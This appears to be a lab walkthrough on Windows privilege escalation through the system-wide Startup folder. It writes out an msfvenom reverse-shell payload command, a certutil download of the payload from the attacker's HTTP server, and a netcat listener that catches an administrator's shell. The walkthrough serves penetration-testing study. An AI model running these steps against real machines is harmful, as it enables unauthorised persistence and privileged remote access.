**Startup Folder**

Any executable file we put in startup folder, it will get executed automatically when machine is powered on.

Startup folders are of two types. User wide and System Wide.

User Wide folder:- This startup folder is for a specific user. When that user logged in, any executable files in this folder will get executed.

<img width="786" height="391" alt="image" src="https://github.com/user-attachments/assets/cefff2c2-ee94-4d55-957d-25f34ded8682" />

System Wide folder :- This startup folder is for all user. If an administrator or any user logs in, any executable files in this folder will get executed. For privilege escalations we need to put the payload on System Wide folder.

<img width="786" height="345" alt="image" src="https://github.com/user-attachments/assets/2824e9dd-f43f-4344-ada8-8d5024084be4" />

***C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup***

<img width="786" height="210" alt="image" src="https://github.com/user-attachments/assets/add33156-9f73-4192-847f-db8da0184d58" />

There is no file in this folder.

Now lets check if we have Write access to this folder or not. Lets check

<img width="786" height="254" alt="image" src="https://github.com/user-attachments/assets/978947ef-ee57-4212-8d96-3f21e3099e9a" />

We are able to create a file in this folder, It means we have write access.

Lets create a reverse shell and put in this folder.

On our machine

***msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.129.101.212 LPORT=4444 -f exe -o shell.exe***

<img width="786" height="135" alt="image" src="https://github.com/user-attachments/assets/2912349e-49aa-4f31-b2e8-ed9208d18847" />

Our payload has been created. Lets move this payload to the target machine

***python -m http.server 9999***

<img width="786" height="142" alt="image" src="https://github.com/user-attachments/assets/c3969c34-08be-422a-8d86-28d8c02f4d7a" />

On the target machine

***certutil -urlcache -split -f http://10.130.76.134:9999/shell.exe shell.exe***

<img width="786" height="270" alt="image" src="https://github.com/user-attachments/assets/2eb8ca10-adca-4943-8c03-a048b7e57ec1" />

File has been transferred.

Lets start netcat

<img width="786" height="181" alt="image" src="https://github.com/user-attachments/assets/098efa94-ce10-4119-ae29-0ada476d1b73" />

Now, lets do RDP again.

Note: We have put the payload in Startup folder. So if a normal user will login, we will get its shell. If an admin will login, we will get Admin user shell.

Lets login via Admin user.

<img width="786" height="102" alt="image" src="https://github.com/user-attachments/assets/6d1d2c47-cccf-47b2-9a88-b8d20bf3793e" />

And we got our shell.

<img width="786" height="261" alt="image" src="https://github.com/user-attachments/assets/d3428461-c060-468f-a4fe-923923fd1c75" />
